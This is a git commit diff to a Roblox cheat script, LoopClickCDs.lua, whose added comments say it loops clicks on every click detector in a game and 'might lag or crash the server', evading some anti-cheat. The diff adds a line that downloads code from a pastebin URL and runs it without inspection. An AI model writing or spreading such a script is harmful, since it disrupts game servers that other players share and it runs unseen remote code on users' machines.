70b0ad5f64aff8b57373914bb4ef25ca0a5f782e
xrt <xrtzrr@proton.me>
2024-04-06 21:20:33 -0600

    Came after awhile to edit.

--- LoopClickCDs.lua
+++ LoopClickCDs.lua
@@ -1,5 +1,7 @@
---To edit wait time (local ttime), check out this pastebin first which has wait time editing along with the loadstring:
---https://pastebin.com/raw/cZxXthEx
+loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
+--< Loadstring: No loadstring. To edit wait time (local ttime), check out this pastebin first which has wait time editing along with the loadstring: https://pastebin.com/raw/cZxXthEx
+--< Game: Universal
+--< Functionality: Allows you to repeatedly loop click every single clickdetector inside a game, which might lag or crash the server. Some anti-cheat scripts built in-game may detect this.
 
 while true do
     repeat
